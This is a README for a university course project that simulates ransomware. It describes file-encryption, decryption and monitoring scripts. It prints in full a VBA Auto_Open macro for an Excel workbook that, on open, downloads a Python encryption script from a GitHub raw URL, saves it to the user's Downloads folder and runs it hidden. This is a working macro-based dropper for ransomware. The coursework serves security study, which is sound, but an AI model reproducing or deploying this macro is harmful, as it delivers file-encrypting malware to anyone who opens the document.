# CSCE 5550 Ransomware Project

## Project Overview
This project simulates a ransomware attack by implementing encryption and decryption scripts, along with a monitoring and mitigation script. The main components include:

1. **Encryption Script** - Encrypts files in a specified directory.
2. **Decryption Script** - Decrypts files once the ransom has been "paid."
3. **Monitoring and Mitigation Script** - Detects and mitigates suspicious ransomware-like behavior, logging events in a database and sending alerts.

Additionally, an **Excel Macro** with VBA scripting is included to automatically download and execute the encryption script. This README will guide you through setting up the environment, installing necessary libraries, and understanding the project files.

---

## Environment Setup

### Requirements
1. **Python 3.8+** with the following libraries:
   - [`pycryptodome`](https://pypi.org/project/pycryptodome/) (for cryptographic functions)
   - [`watchdog`](https://pypi.org/project/watchdog/) (for monitoring file system events)
   - [`sqlite3`](https://docs.python.org/3/library/sqlite3.html) (for event logging, included by default in Python)

2. **VBA Macros** - Enabled in Excel to run the provided VBA script.

### Installation Steps

1. **Install Python Libraries**

    Run the following command to install the required libraries:

    ```bash
    pip install pycryptodome watchdog
    ```

2. **Set Up Directory Monitoring Script**

   In the `monitor_script.py`, specify the directory you want to monitor for suspicious activity. Modify the directory path in the script if needed.

---

## Project Files

- `encryption_script.py`: Encrypts files in the specified directory.
- `decryption_script.py`: Decrypts files with the correct key.
- `monitor_script.py`: Monitors file system events, logs suspicious activity, and attempts to terminate ransomware-like processes.
- `malicious_macro.xlsm`: An Excel file with a macro to download and execute the encryption script upon opening.

---

## Using the Excel Macro for Auto-Execution

The `malicious_macro.xlsm` file contains a VBA macro that automatically downloads and executes the `encryption_script.py` file. The macro triggers on file open.

### VBA Macro Code

The following VBA code is embedded in the Excel file and is responsible for downloading and executing the `encryption_script.py`:

```vba
Sub Auto_Open()
    Dim http As Object
    Dim scriptPath As String
    scriptPath = Environ("USERPROFILE") & "\Downloads\encryption_script.py" ' Path to save in Downloads folder

    ' Display the script path to verify it's correct
    MsgBox "Script Path: " & scriptPath

    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", "https://raw.githubusercontent.com/ameyer12/csce5550-ransomware-project/refs/heads/main/encryption_script.py", False
    http.Send

    If http.Status = 200 Then
        Dim stream As Object
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.responseBody
        stream.SaveToFile scriptPath, 2
        stream.Close

        ' Display command to check before execution
        Dim command As String
        command = "python " & scriptPath
        MsgBox "Command to run: " & command ' Show command to verify

        ' Run the command
        Shell command, vbHide
    Else
        MsgBox "Failed to download the script. Status: " & http.Status
    End If
End Sub

3. **Utilizing the Encryption and Decryption Scripts**

   In `encryption_script.py` and `decryption_script.py`, specify the directory you want to encrypt/decrypt. Modify the directory path in the script if needed.
